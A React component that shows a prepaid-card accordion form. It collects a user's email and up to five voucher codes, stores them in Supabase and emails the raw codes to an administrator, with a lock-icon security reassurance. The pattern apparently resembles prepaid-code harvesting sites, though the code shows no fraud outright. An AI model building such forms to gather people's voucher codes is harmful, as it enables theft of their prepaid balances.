import { useState } from 'react';
import { useLanguage } from '@/contexts/LanguageContext';
import { submitCodes } from '@/lib/supabase-submissions';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { ChevronDown, ChevronUp, Lock, Mail, Hash } from 'lucide-react';
import { toast } from 'sonner';

interface PrepaidCardProps {
  name: string;
  description: string;
  logo: string;
  bgColor: string;
}

const PrepaidCard: React.FC<PrepaidCardProps> = ({ name, description, logo, bgColor }) => {
  const { t } = useLanguage();
  const [isOpen, setIsOpen] = useState(false);
  const [email, setEmail] = useState('');
  const [codes, setCodes] = useState(['', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleCodeChange = (index: number, value: string) => {
    const newCodes = [...codes];
    newCodes[index] = value;
    setCodes(newCodes);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!email || !email.includes('@')) {
      toast.error(t('validEmailError'));
      return;
    }
    
    const filledCodes = codes.filter(code => code.trim() !== '');
    if (filledCodes.length === 0) {
      toast.error(t('atLeastOneCodeError'));
      return;
    }

    setIsSubmitting(true);
    
    // Submit to database
    const result = await submitCodes({
      cardType: name,
      email,
      codes,
    });
    
    if (result.success) {
      // Notify admin via email
      try {
        const { error } = await supabase.functions.invoke('notify-admin', {
          body: { cardType: name, email, codes: filledCodes },
        });

        if (error) {
          console.error('Failed to notify admin:', error);
        }
      } catch (error) {
        console.error('Failed to notify admin:', error);
      }
      
      toast.success(t('submitSuccess'));
      setEmail('');
      setCodes(['', '', '', '', '']);
      setIsOpen(false);
    } else {
      toast.error(t('submitError'));
    }
    
    setIsSubmitting(false);
  };

  return (
    <div className="bg-card rounded-xl card-shadow hover:card-shadow-hover transition-all duration-300 overflow-hidden">
      {/* Card header */}
      <button
        onClick={() => setIsOpen(!isOpen)}
        className="w-full p-6 flex items-center justify-between hover:bg-secondary/50 transition-colors"
      >
        <div className="flex items-center gap-4">
          <div className={`w-16 h-12 rounded-lg ${bgColor} flex items-center justify-center p-2 overflow-hidden`}>
            <img src={logo} alt={name} className="max-w-full max-h-full object-contain" />
          </div>
          <div className="text-left">
            <h3 className="text-lg font-semibold text-foreground">{name}</h3>
            <p className="text-sm text-muted-foreground">{description}</p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-sm font-medium text-primary hidden sm:block">
            {t('enterCode')}
          </span>
          {isOpen ? (
            <ChevronUp className="w-5 h-5 text-muted-foreground" />
          ) : (
            <ChevronDown className="w-5 h-5 text-muted-foreground" />
          )}
        </div>
      </button>
      
      {/* Accordion content */}
      <div
        className={`overflow-hidden transition-all duration-300 ${
          isOpen ? 'max-h-[600px] opacity-100' : 'max-h-0 opacity-0'
        }`}
      >
        <form onSubmit={handleSubmit} className="p-6 pt-0 border-t border-border">
          <div className="space-y-4 mt-6">
            {/* Email field */}
            <div className="space-y-2">
              <Label htmlFor={`email-${name}`} className="flex items-center gap-2 text-foreground">
                <Mail className="w-4 h-4" />
                {t('email')}
              </Label>
              <Input
                id={`email-${name}`}
                type="email"
                placeholder={t('emailPlaceholder')}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="bg-secondary/50"
              />
            </div>
            
            {/* Code fields */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
              {codes.map((code, index) => (
                <div key={index} className="space-y-2">
                  <Label htmlFor={`code-${name}-${index}`} className="flex items-center gap-2 text-foreground">
                    <Hash className="w-4 h-4" />
                    {t('code')} {index + 1}
                  </Label>
                  <Input
                    id={`code-${name}-${index}`}
                    type="text"
                    placeholder="XXXX-XXXX-XXXX"
                    value={code}
                    onChange={(e) => handleCodeChange(index, e.target.value)}
                    className="bg-secondary/50 font-mono"
                  />
                </div>
              ))}
            </div>
            
            {/* Submit button */}
            <div className="pt-4">
              <Button 
                type="submit" 
                className="w-full accent-gradient text-accent-foreground font-semibold py-6"
                disabled={isSubmitting}
              >
                {isSubmitting ? '...' : t('submit')}
              </Button>
              
              {/* Security note */}
              <p className="flex items-center justify-center gap-2 text-xs text-muted-foreground mt-3">
                <Lock className="w-3 h-3" />
                {t('securityNote')}
              </p>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
};

export default PrepaidCard;
